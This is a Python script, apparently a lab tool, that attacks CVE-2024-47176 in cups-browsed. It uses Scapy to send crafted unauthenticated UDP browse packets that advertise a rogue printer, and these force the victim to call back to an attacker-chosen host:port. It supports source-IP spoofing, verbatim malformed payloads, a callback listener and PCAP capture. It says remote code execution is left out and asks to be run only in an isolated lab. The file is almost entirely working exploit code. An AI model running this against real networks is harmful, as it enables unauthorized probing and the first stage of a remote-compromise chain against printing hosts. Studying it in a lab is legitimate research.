#!/usr/bin/env python3
"""
cups_attack.py - CUPS / cups-browsed insecure printer-discovery attack tool.

Investigates CVE-2024-47176: cups-browsed listens on UDP/631 and accepts
unauthenticated legacy "CUPS browse" packets. A single crafted packet makes the
victim initiate an outbound IPP get-printer-attributes connection to an
attacker-specified host:port. This tool crafts and sends those browse packets
with Scapy, optionally catches the victim's callback, and exports a PCAP.

Full remote code execution is intentionally NOT implemented - the goal is to
demonstrate the insecure discovery mechanism only.

*** Use ONLY against your own isolated lab. ***

Legacy CUPS browse packet format (one UDP datagram, ASCII):
    <type-hex> <state-hex> <printer-uri> "<location>" "<info>" "<make-and-model>"
  e.g.
    0 3 http://172.18.0.1:6310/printers/Evil "Office" "Evil Printer" "Generic"
  type 0  = printer (3 = class)
  state 3 = idle    (4 = processing, 5 = stopped)
"""

import argparse
import logging
import socket
import sys
import threading
import time

try:
    from scapy.all import IP, UDP, Raw, send, AsyncSniffer, wrpcap, RandShort
except ImportError:
    sys.exit("Scapy not found. Install with: sudo apt install -y python3-scapy")


# --------------------------------------------------------------------------- #
#  Packet construction
# --------------------------------------------------------------------------- #
def build_browse_payload(host, port, queue, location, info, make_model,
                         scheme="http", ptype=0, state=3, raw_override=None):
    """Return the browse-packet payload as bytes.

    If raw_override is given, it is sent verbatim (used for malformed tests)."""
    if raw_override is not None:
        return raw_override.encode(errors="surrogateescape")
    uri = f"{scheme}://{host}:{port}/printers/{queue}"
    payload = f'{ptype} {state} {uri} "{location}" "{info}" "{make_model}"'
    return payload.encode()


def send_browse(target, target_port, payload, src=None, iface=None,
                count=1, interval=0.5, log=None):
    """Send one or more browse packets to the victim's discovery port."""
    for i in range(count):
        ip = IP(dst=target)
        if src:
            ip.src = src          # spoof source - callback still goes to URI host
        pkt = ip / UDP(sport=RandShort(), dport=target_port) / Raw(load=payload)
        send(pkt, iface=iface, verbose=0)
        log.info("sent browse packet %d/%d -> %s:%d (src=%s, %d bytes payload)",
                 i + 1, count, target, target_port, src or "real", len(payload))
        if i < count - 1:
            time.sleep(interval)


# --------------------------------------------------------------------------- #
#  Callback listener  (proves the victim initiates contact)
# --------------------------------------------------------------------------- #
def listener_thread(bind_host, port, log, stop_event):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((bind_host, port))
    except OSError as e:
        log.error("listener could not bind %s:%d (%s) - is ippserver/nc already "
                  "using it? run without --listen if so", bind_host, port, e)
        return
    srv.listen(5)
    srv.settimeout(1.0)
    log.info("listener up on %s:%d - waiting for victim callback", bind_host, port)
    while not stop_event.is_set():
        try:
            conn, addr = srv.accept()
        except socket.timeout:
            continue
        log.warning("CALLBACK from %s:%d -> victim contacted our advertised printer!",
                    addr[0], addr[1])
        try:
            data = conn.recv(4096)
            if data:
                log.info("  first bytes of victim IPP request: %r", data[:96])
        except OSError:
            pass
        conn.close()
    srv.close()


# --------------------------------------------------------------------------- #
#  Main
# --------------------------------------------------------------------------- #
def main():
    p = argparse.ArgumentParser(
        description="CUPS/cups-browsed insecure printer-discovery attack (Scapy).")
    p.add_argument("--target", required=True, help="victim IP (cups-browsed)")
    p.add_argument("--target-port", type=int, default=631, help="victim UDP port")
    p.add_argument("--printer-host", required=True,
                   help="address the victim should call back to (your listener)")
    p.add_argument("--printer-port", type=int, default=6310, help="callback port")
    p.add_argument("--name", default="Evil", help="advertised queue name")
    p.add_argument("--location", default="Lab", help="browse 'location' field")
    p.add_argument("--info", default="Rogue Printer", help="browse 'info' field")
    p.add_argument("--make-model", default="Generic PostScript",
                   help="browse 'make-and-model' field")
    p.add_argument("--src", default=None,
                   help="spoof the packet source IP (callback still goes to "
                        "--printer-host)")
    p.add_argument("--count", type=int, default=1, help="number of packets to send")
    p.add_argument("--interval", type=float, default=0.5,
                   help="seconds between packets when --count > 1")
    p.add_argument("--raw", default=None,
                   help="send this exact payload verbatim (for malformed tests)")
    p.add_argument("--iface", default=None, help="interface to send/capture on")
    p.add_argument("--pcap", default=None, help="write captured traffic to this file")
    p.add_argument("--listen", action="store_true",
                   help="start a TCP listener to catch the callback")
    p.add_argument("--wait", type=float, default=5.0,
                   help="seconds to wait after sending (for callback/capture)")
    p.add_argument("--log", default=None, help="append log output to this file")
    p.add_argument("-v", "--verbose", action="store_true")
    args = p.parse_args()

    # logging -> console (+ file)
    handlers = [logging.StreamHandler()]
    if args.log:
        handlers.append(logging.FileHandler(args.log))
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s %(levelname)-7s %(message)s", handlers=handlers)
    log = logging.getLogger("cups_attack")

    payload = build_browse_payload(
        args.printer_host, args.printer_port, args.name, args.location,
        args.info, args.make_model, raw_override=args.raw)
    log.info("payload: %s", payload.decode(errors="replace"))

    # optional packet capture
    sniffer = None
    if args.pcap:
        bpf = f"port {args.target_port} or port {args.printer_port}"
        sniffer = AsyncSniffer(iface=args.iface, filter=bpf)
        sniffer.start()
        log.info("capturing (%s) -> %s", bpf, args.pcap)
        time.sleep(0.5)

    # optional callback listener
    stop_event = threading.Event()
    lthread = None
    if args.listen:
        lthread = threading.Thread(
            target=listener_thread,
            args=(args.printer_host, args.printer_port, log, stop_event),
            daemon=True)
        lthread.start()
        time.sleep(0.3)

    # fire
    send_browse(args.target, args.target_port, payload, src=args.src,
                iface=args.iface, count=args.count, interval=args.interval, log=log)

    log.info("waiting %.1fs for victim callback / capture...", args.wait)
    time.sleep(args.wait)

    # teardown
    stop_event.set()
    if lthread:
        lthread.join(timeout=2)
    if sniffer:
        pkts = sniffer.stop()
        wrpcap(args.pcap, pkts)
        log.info("wrote %d packets to %s", len(pkts), args.pcap)


if __name__ == "__main__":
    main()
